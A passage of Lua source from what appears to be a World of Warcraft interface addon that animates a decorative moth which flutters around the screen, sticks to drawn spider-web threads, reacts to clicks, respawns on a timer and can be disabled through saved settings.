        STICK_NSPDURINGDRAG = true,

        RESPAWN_MIN_SECONDS = 30 * 60,
        RESPAWN_MAX_SECONDS = 60 * 60,
    },

    state = {
        x = 0,
        y = 0,
        vx = 0,
        vy = 0,
        desiredSpeed = 120,
        speedTimer = 0,
        jerkTimer = 0,
        wing = false,
        flapTimer = 0,
        flapInterval = 0.04,
        checkTimer = 0,
        stuckOwner = nil,
        stuckT = 0,
        offX = 0,
        offY = 0,
        twitchVelX = 0,
        twitchVelY = 0,
        twitchTimer = 0,
        dead = false,
        deadTimer = 0,
        clickImmunity = 0,
        webFailUntil = 0,
        webFailActive = false,
        frozen = false,
        destroyed = false,
    },
}

_G.NSPauk_Moth = NSPauk_Moth
_G.NSPauk_Moth_StuckInfo = NSPauk_Moth.stuckInfo

---------------------------------------------------------------------------
-- Local helpers
---------------------------------------------------------------------------

local function HasPoint(p)
    return type(p) == "table"
        and type(p.x) == "number"
        and type(p.y) == "number"
end

local function IsFrameObject(f)
    local t = type(f)

    if t ~= "table" and t ~= "userdata" then
        return false
    end

    return f.IsShown and f.SetPoint and f.GetWidth and true
end

local function TrimLower(s)
    s = s or ""
    s = s:gsub("^%s+", "")
    s = s:gsub("%s+$", "")

    return s:lower()
end

---------------------------------------------------------------------------
-- Chat
---------------------------------------------------------------------------

function NSPauk_Moth:Print(...)
    local n = select("#", ...)
    local parts = {}

    for i = 1, n do
        parts[i] = tostring(select(i, ...))
    end

    local chat = DEFAULT_CHAT_FRAME or ChatFrame1

    if chat and chat.AddMessage then
        --chat:AddMessage("|cff66ccffNSMoth:|r " .. table.concat(parts, " "))
    end
end

---------------------------------------------------------------------------
-- Textures
---------------------------------------------------------------------------

function NSPauk_Moth:GetTexturePath(name)
    if type(NSPauk) == "table"
        and type(NSPauk.C) == "table"
        and type(NSPauk.C.TEX_WEB) == "string" then
        local web = NSPauk.C.TEX_WEB

        if #web >= 11 and web:lower():sub(-11) == "pautina8.tga" then
            return web:sub(1, #web - 11) .. name
        end
    end

    return "Interface\\AddOns\\NSQC3\\libs\\" .. name
end

---------------------------------------------------------------------------
-- Anchor / parent selection
---------------------------------------------------------------------------

function NSPauk_Moth:GetAnchorFrame()
    local mode = self.parentMode or "auto"

    local web

    if type(NSPauk) == "table" then
        web = NSPauk.F_HIGH

        if type(web) == "string" then
            web = _G[web]
        end
    end

    if not IsFrameObject(web) and IsFrameObject(_G.NSPauk_WebHigh) then
        web = _G.NSPauk_WebHigh
    end

    if mode == "ui" then
        return UIParent
    end

    if mode == "web" then
        if IsFrameObject(web) then
            return web
        end

        return UIParent
    end

    if IsFrameObject(web) then
        local visible = true

        if web.IsVisible then
            visible = web:IsVisible()
        end

        if visible then
            return web
        end
    end

    return UIParent
end

---------------------------------------------------------------------------
-- Screen / parent size
---------------------------------------------------------------------------

function NSPauk_Moth:ScreenSize()
    local parent = self:GetAnchorFrame()

    if IsFrameObject(parent) then
        local w = parent:GetWidth()
        local h = parent:GetHeight()

        if w and h and w > 0 and h > 0 then
            return w, h
        end
    end

    if UIParent then
        local w = UIParent:GetWidth()
        local h = UIParent:GetHeight()

        if w and h and w > 0 and h > 0 then
            return w, h
        end
    end

    local sw = GetScreenWidth and GetScreenWidth() or 0
    local sh = GetScreenHeight and GetScreenHeight() or 0

    if sw > 0 and sh > 0 then
        return sw, sh
    end

    return 1, 1
end

---------------------------------------------------------------------------
-- Frame creation
---------------------------------------------------------------------------

function NSPauk_Moth:CreateWidgets()
    if self.frame then
        return
    end

    if self.blocked or self:IsBlockedByDB() then
        return
    end

    local cfg = self.cfg
    local parent = self:GetAnchorFrame()

    local frameName = "NSPauk_MothFrame"
    if _G[frameName] then
        frameName = nil
    end

    local f = CreateFrame("Frame", frameName, parent)
    f:SetFrameStrata("TOOLTIP")
    f:SetFrameLevel(103)
    f:SetWidth(cfg.CLICK_AREA)
    f:SetHeight(cfg.CLICK_AREA)
    f:EnableMouse(true)
    f:Hide()
    self.frame = f

    local tex = f:CreateTexture(nil, "OVERLAY")
    tex:SetWidth(cfg.SIZE)
    tex:SetHeight(cfg.SIZE)
    tex:SetPoint("CENTER", f, "CENTER", 0, 0)
    tex:SetDrawLayer("OVERLAY")
    tex:Show()
    self.tex = tex

    self.tex1 = self:GetTexturePath("m1.tga")
    self.tex2 = self:GetTexturePath("m2.tga")
    self:ApplyTexture()

    f:SetScript("OnUpdate", function(_, elapsed)
        NSPauk_Moth:OnUpdate(elapsed)
    end)

    f:SetScript("OnMouseDown", function(_, button)
        NSPauk_Moth:OnClick(button)
    end)
end

---------------------------------------------------------------------------
-- Appearance
---------------------------------------------------------------------------

function NSPauk_Moth:ApplyTexture()
    if not self.tex
        or not self.frame
        or self.destroyed
        or (self.state and self.state.frozen) then
        return
    end

    local cfg = self.cfg

    self.tex:ClearAllPoints()
    self.tex:SetWidth(cfg.SIZE)
    self.tex:SetHeight(cfg.SIZE)
    self.tex:SetPoint("CENTER", self.frame, "CENTER", 0, 0)
    self.tex:SetBlendMode("BLEND")
    self.tex:SetAlpha(1)
    self.tex:SetVertexColor(1, 1, 1, 1)
    self.tex:SetTexture(self.state.wing and self.tex2 or self.tex1)
    self.tex:Show()
end

function NSPauk_Moth:SetWing(w)
    if self.destroyed or (self.state and self.state.frozen) then
        return
    end

    self.state.wing = w

    self:ApplyTexture()
end

function NSPauk_Moth:Place()
    if not self.frame or self.destroyed or (self.state and self.state.frozen) then
        return
    end

    local parent = self:GetAnchorFrame()

    if IsFrameObject(parent) and self.frame:GetParent() ~= parent then
        self.frame:SetParent(parent)
        self.frame:SetFrameStrata("TOOLTIP")
        self.frame:SetFrameLevel(103)
    end

    self.frame:ClearAllPoints()
    self.frame:SetPoint("CENTER", parent, "BOTTOMLEFT", self.state.x, self.state.y)

    self:UpdateStuckInfo()
end

---------------------------------------------------------------------------
-- NSPauk web data helpers
---------------------------------------------------------------------------

function NSPauk_Moth:ThreadIsValid(thread)
    if type(thread) ~= "table" then
        return false
    end

    local p0 = thread.p0
    local p2 = thread.p2

    if not HasPoint(p0) or not HasPoint(p2) then
        return false
    end

    local dx = p2.x - p0.x
    local dy = p2.y - p0.y

    return (dx * dx + dy * dy) > 1.0
end

function NSPauk_Moth:ThreadPointAt(thread, t)
    if type(thread) ~= "table" then
        return 0, 0
    end

    local p0 = thread.p0
    local p2 = thread.p2

    if not HasPoint(p0) or not HasPoint(p2) then
        return 0, 0
    end

    local p1 = thread.p1

    if not HasPoint(p1) then
        p1 = {
            x = (p0.x + p2.x) / 2,
            y = (p0.y + p2.y) / 2,
        }
    end

    local m = 1 - t

    return m * m * p0.x + 2 * m * t * p1.x + t * t * p2.x,
        m * m * p0.y + 2 * m * t * p1.y + t * t * p2.y
end

function NSPauk_Moth:ThreadNearBox(thread, x, y, pad)
    local p0 = thread.p0
    local p2 = thread.p2

    if not HasPoint(p0) or not HasPoint(p2) then
        return false
    end

    local minX = p0.x
    local maxX = p0.x
    local minY = p0.y
    local maxY = p0.y

    local p1 = thread.p1

    if HasPoint(p1) then
        if p1.x < minX then
            minX = p1.x
        end

        if p1.x > maxX then
            maxX = p1.x
        end

        if p1.y < minY then
            minY = p1.y
        end

        if p1.y > maxY then
            maxY = p1.y
        end
    end

    if p2.x < minX then
        minX = p2.x
    end

    if p2.x > maxX then
        maxX = p2.x
    end

    if p2.y < minY then
        minY = p2.y
    end

    if p2.y > maxY then
        maxY = p2.y
    end

    return x >= minX - pad
        and x <= maxX + pad
        and y >= minY - pad
        and y <= maxY + pad
end

function NSPauk_Moth:NearestThreadT(thread, x, y)
    local bestT = 0
    local bestD2 = math.huge

    for i = 0, 16 do
        local t = i / 16

        local px, py = self:ThreadPointAt(thread, t)

        local dx = px - x
        local dy = py - y

        local d2 = dx * dx + dy * dy

        if d2 < bestD2 then
            bestD2 = d2
            bestT = t
        end
    end

    return bestT, bestD2
end

---------------------------------------------------------------------------
-- Sticky target filter
---------------------------------------------------------------------------

function NSPauk_Moth:IsStickyTarget(obj, thread)
    local allowTravel = self.cfg.STICK_KIND_TRAVEL == true
    local allowCrawl = self.cfg.STICK_NSPCRAWL == true
    local allowNoInsert = self.cfg.STICK_NSPNOINSERT ~= false
    local allowDuringDrag = self.cfg.STICK_NSPDURINGDRAG ~= false

    local function checkOne(tbl)
        if type(tbl) ~= "table" then
            return true
        end

        if tbl.kind == "travel" and not allowTravel then
            return false
        end

        if tbl.nspCrawl == true and not allowCrawl then
            return false
        end

        if tbl.nspNoInsert == true and not allowNoInsert then
            return false
        end

        if tbl.nspDuringDrag == true and not allowDuringDrag then
            return false
        end

        return true
    end

    if not checkOne(obj) then
        return false
    end

    if not checkOne(thread) then
        return false
    end

    if type(thread) == "table" then
        local n = 0

        for _, v in pairs(thread) do
            if type(v) == "table" then
                n = n + 1

                if n > 160 then
                    break
                end

                if not checkOne(v) then
                    return false
                end
            end
        end
    end

    return true
end

---------------------------------------------------------------------------
-- Web owner visibility check.
-- Uses NSPauk data directly: owner.textures.
---------------------------------------------------------------------------

function NSPauk_Moth:IsWebOwnerDrawn(owner)
    if type(owner) ~= "table" then
        return false
    end

    if owner.alive == false then
        return false
    end

    if owner.hidden == true or owner.visible == false then
        return false
    end

    if not self:ThreadIsValid(owner.thread) then
        return false
    end

    local textures = owner.textures

    if type(textures) ~= "table" or #textures == 0 then
        return false
    end

    return true
end

---------------------------------------------------------------------------
-- Stick chance
---------------------------------------------------------------------------

function NSPauk_Moth:RollStickChance()
    local chance = self.cfg.STICK_CHANCE

    if chance == nil then
        chance = 1 / 3
    end

    if chance <= 0 then
        return false
    end

    if chance >= 1 then
        return true
    end

    return math.random() < chance
end

---------------------------------------------------------------------------
-- Escape impulse after failed stick
---------------------------------------------------------------------------

function NSPauk_Moth:WebEscapeImpulse()
    local s = self.state

    if not s or s.dead or s.stuckOwner then
        return
    end

    local vx = s.vx or 0
    local vy = s.vy or 0

    local speed = math.sqrt(vx * vx + vy * vy)

    local angle

    if speed > 1 then
        angle = math.atan2(vy, vx)
    else
        angle = math.random() * 2 * math.pi
    end

    local side = (math.random() < 0.5) and -1 or 1
    local offset = side * (math.pi / 3 + math.random() * math.pi / 3)

    local impMin = self.cfg.STICK_FAIL_IMPULSE_MIN or 90
    local impMax = self.cfg.STICK_FAIL_IMPULSE_MAX or 180

    if impMax < impMin then
        impMax = impMin
    end

    local imp = impMin + math.random() * (impMax - impMin)

    s.vx = vx + math.cos(angle + offset) * imp
    s.vy = vy + math.sin(angle + offset) * imp
end

---------------------------------------------------------------------------
-- Find web
---------------------------------------------------------------------------

function NSPauk_Moth:FindWeb(x, y)
    self.lastWebInfo = nil

    if self.destroyed or (self.state and self.state.frozen) then
        return nil
    end

    if type(NSPauk) ~= "table" then
        return nil
    end

    local S = NSPauk.S

    if type(S) ~= "table" or type(S.instances) ~= "table" then
        return nil
    end

    local s = self.state

    if type(s) ~= "table" then
        return nil
    end

    local now = GetTime and GetTime() or 0

    local stickDist = tonumber(self.cfg.STICK_DIST) or 9
    local stick2 = stickDist * stickDist
    local pad = stickDist + 4

    local allowConns = self.cfg.STICK_CONNS ~= false
    local allowCrossSegs = self.cfg.STICK_CROSSSEGS ~= false
    local strict = self.cfg.STICK_ONLY_VISIBLE_TEXTURE ~= false

    local candidates = {}

    local function addCandidate(source, instIndex, index, obj)
        if type(obj) ~= "table" then
            return
        end

        if obj.alive
            and obj.hidden ~= true
            and obj.visible ~= false
            and self:ThreadIsValid(obj.thread)
            and self:IsStickyTarget(obj, obj.thread) then
            if self:ThreadNearBox(obj.thread, x, y, pad) then
                local t, d2 = self:NearestThreadT(obj.thread, x, y)

                if d2 <= stick2 then
                    local baseX, baseY = self:ThreadPointAt(obj.thread, t)

                    candidates[#candidates + 1] = {
                        owner = obj,
                        t = t,
                        d2 = d2,
                        dist = math.sqrt(d2),
                        source = source,
                        inst = instIndex,
                        index = index,
                        baseX = baseX,
                        baseY = baseY,
                    }
                end
            end
        end
    end

    for instIndex, inst in pairs(S.instances) do
        if type(inst) == "table"
            and not inst.torn
            and inst.alive ~= false
            and inst.hidden ~= true
            and inst.visible ~= false then
            if allowConns and type(inst.conns) == "table" then
                for connIndex, conn in pairs(inst.conns) do
                    addCandidate("conns", instIndex, connIndex, conn)
                end
            end

            if allowCrossSegs and type(inst.crossSegs) == "table" then
                for segIndex, seg in pairs(inst.crossSegs) do
                    addCandidate("crossSegs", instIndex, segIndex, seg)
                end
            end
        end
    end

    if #candidates == 0 then
        if s.webFailActive and now >= (s.webFailUntil or 0) then
            s.webFailActive = false
        end

        return nil
    end

    table.sort(candidates, function(a, b)
        return a.d2 < b.d2
    end)

    local nearest = candidates[1]
    local selected = nil
    local lastRejected = nil

    for _, cand in ipairs(candidates) do
        local ok = true

        if strict then
            ok = self:IsWebOwnerDrawn(cand.owner)
        end

        if ok then
            selected = cand
            break
        else
            lastRejected = "owner not drawn"
        end
    end

    if not selected then
        self.lastWebInfo = {
            source = nearest.source,
            inst = nearest.inst,
            index = nearest.index,
            t = nearest.t,
            dist = nearest.dist,
            baseX = nearest.baseX,
            baseY = nearest.baseY,
            visibleTexture = false,
            rejected = lastRejected or "owner not drawn",
        }

        if s.webFailActive and now >= (s.webFailUntil or 0) then
            s.webFailActive = false
        end

        return nil
    end

    local info = {
        source = selected.source,
        inst = selected.inst,
        index = selected.index,
        t = selected.t,
        dist = selected.dist,
        baseX = selected.baseX,
        baseY = selected.baseY,
        visibleTexture = true,
        rejected = nil,
    }

    self.lastWebInfo = info

    if s.webFailActive then
        if now < (s.webFailUntil or 0) then
            if self.cfg.STICK_FAIL_REQUIRE_LEAVE ~= false then
                info.rejected = "chance fail: leave web first"
            else
                info.rejected = "chance cooldown"
            end

            return nil
        end

        s.webFailActive = false
    end

    if self:RollStickChance() then
        s.webFailActive = false
        s.webFailUntil = 0

        return selected.owner, selected.t
    end

    local min = tonumber(self.cfg.STICK_FAIL_IMMUNITY_MIN) or 0.75
    local max = tonumber(self.cfg.STICK_FAIL_IMMUNITY_MAX) or 1.50

    if max < min then
        max = min
    end

    local duration = min + math.random() * (max - min)

    if self.cfg.STICK_FAIL_REQUIRE_LEAVE ~= false then
        duration = math.max(duration, 2.0)
    end

    s.webFailActive = true
    s.webFailUntil = now + duration

    info.rejected = "chance fail"

    self:WebEscapeImpulse()

    return nil
end

---------------------------------------------------------------------------
-- Movement base
---------------------------------------------------------------------------

function NSPauk_Moth:KickOff()
    local s = self.state
    local cfg = self.cfg

    local angle = math.random() * 2 * math.pi
    local speed = cfg.SPEED_MIN + math.random() * (cfg.SPEED_MAX - cfg.SPEED_MIN)

    s.vx = math.cos(angle) * speed
    s.vy = math.sin(angle) * speed

    s.desiredSpeed = speed
    s.speedTimer = 0.30 + math.random() * 0.95
    s.jerkTimer = cfg.JERK_MIN + math.random() * (cfg.JERK_MAX - cfg.JERK_MIN)
end

function NSPauk_Moth:Release()
    if self.destroyed or (self.state and self.state.frozen) then
        return
    end

    local s = self.state
    local cfg = self.cfg

    s.stuckOwner = nil
    s.stuckT = 0
    s.offX = 0
    s.offY = 0
    s.twitchVelX = 0
    s.twitchVelY = 0
    s.twitchTimer = 0

    self:KickOff()

    s.flapInterval = cfg.FLAP_FLY * (0.65 + math.random() * 0.70)

    s.webFailActive = false
    s.webFailUntil = 0

    self:UpdateStuckInfo()
end

---------------------------------------------------------------------------
-- Click behavior
---------------------------------------------------------------------------

function NSPauk_Moth:Kill()
    if self.destroyed or (self.state and self.state.frozen) then
        return
    end

    local s = self.state

    if not s or s.dead then
        return
    end

    s.dead = true
    s.deadTimer = 0
    s.stuckOwner = nil
    s.vx = 0
    s.vy = 0

    if self.frame then
        self.frame:EnableMouse(false)
    end

    if self.tex then
        self.tex:SetAlpha(1)
    end

    self:UpdateStuckInfo()
end

function NSPauk_Moth:DashSideways()
    if self.destroyed or not self.state or self.state.dead or self.state.frozen then
        return
    end

    local s = self.state
    local cfg = self.cfg

    if s.stuckOwner then
        self:Release()
    end

    local speed = math.sqrt(s.vx * s.vx + s.vy * s.vy)

    local angle

    if speed > 1 then
        angle = math.atan2(s.vy, s.vx)
    else
        angle = math.random() * 2 * math.pi
    end

    local side = (math.random() < 0.5) and -1 or 1
    local sideAngle = angle + side * math.pi / 2

    local dx = math.cos(sideAngle) * cfg.DASH_DISTANCE
    local dy = math.sin(sideAngle) * cfg.DASH_DISTANCE

    s.x = s.x + dx
    s.y = s.y + dy

    local sw, sh = self:ScreenSize()

    if s.x < cfg.MARGIN then
        s.x = cfg.MARGIN
    elseif s.x > sw - cfg.MARGIN then
        s.x = sw - cfg.MARGIN
    end

    if s.y < cfg.MARGIN then
        s.y = cfg.MARGIN
    elseif s.y > sh - cfg.MARGIN then
        s.y = sh - cfg.MARGIN
    end

    s.vx = s.vx + math.cos(sideAngle) * cfg.DASH_IMPULSE
    s.vy = s.vy + math.sin(sideAngle) * cfg.DASH_IMPULSE

    s.desiredSpeed = cfg.SPEED_MAX
    s.speedTimer = 0.35 + math.random() * 0.45
    s.jerkTimer = math.min(s.jerkTimer or 0, 0.12)
    s.clickImmunity = cfg.DASH_IMMUNITY

    self:Place()
    self:UpdateStuckInfo()
end

function NSPauk_Moth:OnClick(button)
    if not self.inited
        or self.destroyed
        or not self.state
        or self.state.dead
        or self.state.frozen then
        return
    end

    if button and button ~= "LeftButton" then
        return
    end

    if math.random() < 0.10 then
        self:Kill()
    else
        self:DashSideways()
    end
end

---------------------------------------------------------------------------
-- Public stuck info
---------------------------------------------------------------------------

function NSPauk_Moth:UpdateStuckInfo()
    if not self.state then
        return
    end

    local s = self.state
    local info = self.stuckInfo or {}

    info.x = s.x
    info.y = s.y
    info.dead = s.dead

    local owner = s.stuckOwner

    if owner
        and owner.alive
        and type(owner.thread) == "table"
        and self:ThreadIsValid(owner.thread) then
        local baseX, baseY = self:ThreadPointAt(owner.thread, s.stuckT)

        info.stuck = true
        info.owner = owner
        info.thread = owner.thread
        info.t = s.stuckT
        info.baseX = baseX
        info.baseY = baseY

        info.p0x = owner.thread.p0.x
        info.p0y = owner.thread.p0.y
        info.p2x = owner.thread.p2.x
        info.p2y = owner.thread.p2.y

        local p1 = owner.thread.p1

        if type(p1) == "table"
            and type(p1.x) == "number"
            and type(p1.y) == "number" then
            info.p1x = p1.x
            info.p1y = p1.y
        else
            info.p1x = nil
            info.p1y = nil
        end

        if self.lastWebInfo then
            info.source = self.lastWebInfo.source
            info.inst = self.lastWebInfo.inst
            info.index = self.lastWebInfo.index
            info.webDist = self.lastWebInfo.dist
            info.visibleTexture = self.lastWebInfo.visibleTexture
            info.rejected = self.lastWebInfo.rejected
        else
            info.source = nil
            info.inst = nil
            info.index = nil
            info.webDist = nil
            info.visibleTexture = nil
            info.rejected = nil
        end

        info.time = GetTime()
        info.firstStuckTime = info.firstStuckTime or info.time

        self.stuckInfo = info

        local last = self.lastStuckInfo or {}

        for k, v in pairs(info) do
            last[k] = v
        end

        last.lastSeenTime = info.time

        self.lastStuckInfo = last
    else
        info.stuck = false
        info.owner = nil
        info.thread = nil
        info.t = nil
        info.baseX = nil
        info.baseY = nil
        info.p0x = nil
        info.p0y = nil
        info.p1x = nil
        info.p1y = nil
        info.p2x = nil
        info.p2y = nil
        info.source = nil
        info.inst = nil
        info.index = nil
        info.webDist = nil
        info.visibleTexture = nil
        info.rejected = nil
        info.firstStuckTime = nil

        self.stuckInfo = info
    end

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo
end

---------------------------------------------------------------------------
-- Respawn timer
---------------------------------------------------------------------------

function NSPauk_Moth:EnsureTimerFrame()
    if self.timerFrame then
        return
    end

    if self.blocked or self:IsBlockedByDB() then
        return
    end

    local f = CreateFrame("Frame")
    f:Hide()
    f:SetScript("OnUpdate", function(_, elapsed)
        NSPauk_Moth:OnRespawnTimer(elapsed)
    end)
    self.timerFrame = f
end

function NSPauk_Moth:ScheduleRespawn()
    if self.blocked or self:IsBlockedByDB() then
        self:CancelRespawn()
        return
    end

    local min = self.cfg.RESPAWN_MIN_SECONDS or (10 * 60)
    local max = self.cfg.RESPAWN_MAX_SECONDS or (30 * 60)
    if max < min then
        max = min
    end

    self.respawnRemaining = math.random(min, max)
    self:EnsureTimerFrame()

    if self.timerFrame then
        self.timerFrame:Show()
    end
end

function NSPauk_Moth:CancelRespawn()
    self.respawnRemaining = nil

    if self.timerFrame then
        self.timerFrame:Hide()
    end
end

function NSPauk_Moth:OnRespawnTimer(dt)
    if self.blocked or self:IsBlockedByDB() then
        self:CancelRespawn()
        return
    end

    if not self.respawnRemaining then
        if self.timerFrame then
            self.timerFrame:Hide()
        end
        return
    end

    self.respawnRemaining = self.respawnRemaining - dt
    if self.respawnRemaining <= 0 then
        self:Respawn()
    end
end

---------------------------------------------------------------------------
-- Freeze / destroy / respawn
---------------------------------------------------------------------------

function NSPauk_Moth:Freeze()
    if self.destroyed then
        return
    end

    if not self.inited then
        self.freezeRequested = true
        self:Init()

        return
    end

    self.state.frozen = true

    if self.frame then
        self.frame:EnableMouse(false)
        self.frame:SetScript("OnUpdate", nil)
        self.frame:Show()
    end

    self:UpdateStuckInfo()
end

function NSPauk_Moth:ResetState()
    self.state = self.state or {}

    local s = self.state

    local sw, sh = 1, 1

    if self.ScreenSize then
        sw, sh = self:ScreenSize()
    end

    local flapFly = 0.04

    if self.cfg and self.cfg.FLAP_FLY then
        flapFly = self.cfg.FLAP_FLY
    end

    s.x = sw * 0.5
    s.y = sh * 0.5
    s.vx = 0
    s.vy = 0
    s.desiredSpeed = 120
    s.speedTimer = 0
    s.jerkTimer = 0
    s.wing = false
    s.flapTimer = 0
    s.flapInterval = flapFly * (0.65 + math.random() * 0.70)
    s.checkTimer = 0
    s.stuckOwner = nil
    s.stuckT = 0
    s.offX = 0
    s.offY = 0
    s.twitchVelX = 0
    s.twitchVelY = 0
    s.twitchTimer = 0
    s.dead = false
    s.deadTimer = 0
    s.clickImmunity = 0
    s.webFailUntil = 0
    s.webFailActive = false
    s.frozen = false
    s.destroyed = false
end

function NSPauk_Moth:Init()
    if self.blocked or self:IsBlockedByDB() then
        self.blocked = true
        return
    end

    if self.destroyed then
        return
    end

    if self.inited then
        return
    end

    self.state = self.state or {}
    self.stuckInfo = self.stuckInfo or {
        stuck = false,
        x = 0,
        y = 0,
    }

    if self.stuckInfo then
        self.stuckInfo.destroyed = nil
        self.stuckInfo.blocked = nil
    end

    local shouldFreeze = self.freezeRequested or self.state.frozen

    self:ResetState()
    self:CreateWidgets()

    local sw, sh = self:ScreenSize()
    local s = self.state
    s.x = sw * 0.5
    s.y = sh * 0.5

    self:KickOff()

    if self.tex then
        self.tex:SetAlpha(1)
    end

    if self.frame then
        self.frame:EnableMouse(true)
    end

    self.inited = true
    _G.NSPauk_Moth_StuckInfo = self.stuckInfo

    self:Place()
    self:Show()
    self:UpdateStuckInfo()

    if shouldFreeze then
        self.freezeRequested = false
        s.frozen = true

        if self.frame then
            self.frame:EnableMouse(false)
            self.frame:SetScript("OnUpdate", nil)
            self.frame:Show()
        end
    end
end

function NSPauk_Moth:Destroy()
    if self.blocked or self:IsBlockedByDB() then
        if not self.blocked then
            self:Block()
        end
        return
    end

    if self.destroyed then
        return
    end

    self.destroyed = true
    self.freezeRequested = false
    self.inited = false

    self:CancelRespawn()
    self:TeardownWidgets(false)

    self.lastWebInfo = nil
    self.lastStuckInfo = nil

    if self.stuckInfo then
        for k in pairs(self.stuckInfo) do
            self.stuckInfo[k] = nil
        end
        self.stuckInfo.destroyed = true
        self.stuckInfo.stuck = false
    end

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo

    self:ResetState()
    self.state.frozen = true
    self.state.destroyed = true

    self:ScheduleRespawn()
end

function NSPauk_Moth:Respawn()
    self:CancelRespawn()

    if self.blocked or self:IsBlockedByDB() then
        return
    end

    if not self.destroyed and self.inited then
        return
    end

    self.destroyed = false
    self.freezeRequested = false

    if self.state then
        self.state.frozen = false
        self.state.destroyed = false
        self.state.dead = false
    end

    self.inited = false
    self:Init()
end

---------------------------------------------------------------------------
-- Show / hide
---------------------------------------------------------------------------

function NSPauk_Moth:Show()
    if self.destroyed or self.blocked or self:IsBlockedByDB() then
        return
    end

    if not self.inited then
        self:Init()
        return
    end

    if self.state.dead then
        return
    end

    if self.frame then
        self.frame:Show()
    end

    if self.tex then
        self.tex:SetAlpha(1)
    end
end

function NSPauk_Moth:Hide()
    if self.frame then
        self.frame:Hide()
    end
end

function NSPauk_Moth:Toggle()
    if self.destroyed or not self.frame then
        return
    end

    if self.frame:IsShown() then
        self:Hide()
    elseif not self.state.dead then
        self:Show()
    end
end

---------------------------------------------------------------------------
-- Persistent block via nsDbc
---------------------------------------------------------------------------
function NSPauk_Moth:EnsureDb()
    if type(_G.nsDbc) ~= "table" then
        _G.nsDbc = {}
    end
    return _G.nsDbc
end

function NSPauk_Moth:IsBlockedByDB()
    local db = _G.nsDbc
    if type(db) ~= "table" then
        return false
    end

    local moth = db.moth
    if moth == nil or moth == false then
        return false
    end

    if type(moth) == "table" then
        return moth.blocked ~= false
    end

    return true
end

function NSPauk_Moth:SetBlockedDB(value)
    local db = self:EnsureDb()
    if value then
        db.moth = {
            blocked = true,
            time = GetTime and GetTime() or 0,
        }
    else
        db.moth = nil
    end
end

function NSPauk_Moth:TeardownWidgets(removeBootstrap)
    self:CancelRespawn()

    if self.timerFrame then
        self.timerFrame:SetScript("OnUpdate", nil)
        self.timerFrame:Hide()
        self.timerFrame = nil
    end

    if self.frame then
        self.frame:EnableMouse(false)
        self.frame:SetScript("OnUpdate", nil)
        self.frame:SetScript("OnMouseDown", nil)
        self.frame:Hide()
        self.frame:ClearAllPoints()
        self.frame = nil
    end

    if self.tex then
        self.tex:SetTexture(nil)
        self.tex:ClearAllPoints()
        self.tex:Hide()
        self.tex = nil
    end

    self.tex1 = nil
    self.tex2 = nil

    if removeBootstrap and self.bootstrap then
        if self.bootstrap.UnregisterEvent then
            self.bootstrap:UnregisterEvent("PLAYER_LOGIN")
        end
        self.bootstrap:Hide()
        self.bootstrap = nil
    end

    if _G.NSPauk_MothFrame then
        _G.NSPauk_MothFrame = nil
    end
end

function NSPauk_Moth:Block()
    self.blocked = true
    self.freezeRequested = false
    self.destroyed = true
    self.inited = false

    self:TeardownWidgets(true)

    self.lastWebInfo = nil
    self.lastStuckInfo = nil

    if self.stuckInfo then
        for k in pairs(self.stuckInfo) do
            self.stuckInfo[k] = nil
        end
        self.stuckInfo.destroyed = true
        self.stuckInfo.blocked = true
        self.stuckInfo.stuck = false
    end

    self:ResetState()
    self.state.frozen = true
    self.state.destroyed = true

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo
end

function NSPauk_Moth:Unblock()
    self.blocked = false
    self.freezeRequested = false
    self.destroyed = false
    self.inited = false

    if self.state then
        self.state.frozen = false
        self.state.destroyed = false
        self.state.dead = false
    end

    if self.stuckInfo then
        for k in pairs(self.stuckInfo) do
            self.stuckInfo[k] = nil
        end
        self.stuckInfo.stuck = false
        self.stuckInfo.x = 0
        self.stuckInfo.y = 0
    end

    _G.NSPauk_Moth_StuckInfo = self.stuckInfo
    self:Init()
end

function NSPauk_Moth:ToggleBlocked()
    if self:IsBlockedByDB() then
        self:SetBlockedDB(false)
        self:Unblock()
    else
        self:SetBlockedDB(true)
        self:Block()
    end
end

---------------------------------------------------------------------------
-- OnUpdate
---------------------------------------------------------------------------

function NSPauk_Moth:OnUpdate(dt)
    if not self.inited or not self.frame or self.destroyed then
        return
    end

    local s = self.state

    if not s or s.frozen then
        return
    end

    dt = dt or 0

    if dt > 0.1 then
        dt = 0.1
    end

    local cfg = self.cfg

    -----------------------------------------------------------------------
    -- Death fade.
    -----------------------------------------------------------------------

    if s.dead then
        s.deadTimer = s.deadTimer + dt

        local alpha = 1 - (s.deadTimer / cfg.DEATH_FADE_TIME)

        if alpha < 0 then
            alpha = 0
        end

        if self.tex then
            self.tex:SetAlpha(alpha)
        end

        if alpha <= 0 then
            self:Destroy()
        end

        return
    end

    if s.clickImmunity > 0 then
        s.clickImmunity = s.clickImmunity - dt
    end

    -----------------------------------------------------------------------
    -- Wing flap.
    -----------------------------------------------------------------------

    s.flapTimer = s.flapTimer + dt

    if s.flapTimer >= s.flapInterval then
        s.flapTimer = 0

        local base = s.stuckOwner and cfg.FLAP_STUCK or cfg.FLAP_FLY

        s.flapInterval = base * (0.65 + math.random() * 0.70)

        self:SetWing(not s.wing)
    end

    -----------------------------------------------------------------------
    -- Stuck on web.
    -----------------------------------------------------------------------

    if s.stuckOwner then
        local owner = s.stuckOwner

        if not owner
            or not owner.alive
            or not self:ThreadIsValid(owner.thread) then
            self:Release()
        else
            local baseX, baseY = self:ThreadPointAt(owner.thread, s.stuckT)

            s.twitchTimer = s.twitchTimer - dt

            if s.twitchTimer <= 0 then
                s.twitchTimer = cfg.STUCK_JERK_MIN
                    + math.random() * (cfg.STUCK_JERK_MAX - cfg.STUCK_JERK_MIN)

                local a = math.random() * 2 * math.pi

                local imp = cfg.STUCK_JERK_SPEED_MIN
                    + math.random() * (cfg.STUCK_JERK_SPEED_MAX - cfg.STUCK_JERK_SPEED_MIN)

                s.twitchVelX = s.twitchVelX + math.cos(a) * imp
                s.twitchVelY = s.twitchVelY + math.sin(a) * imp
            end

            local ax = -s.offX * cfg.STUCK_SPRING - s.twitchVelX * cfg.STUCK_DAMP
            local ay = -s.offY * cfg.STUCK_SPRING - s.twitchVelY * cfg.STUCK_DAMP

            s.twitchVelX = s.twitchVelX + ax * dt
            s.twitchVelY = s.twitchVelY + ay * dt

            s.offX = s.offX + s.twitchVelX * dt
            s.offY = s.offY + s.twitchVelY * dt

            local offLen = math.sqrt(s.offX * s.offX + s.offY * s.offY)

            if offLen > cfg.STUCK_OFFSET_MAX then
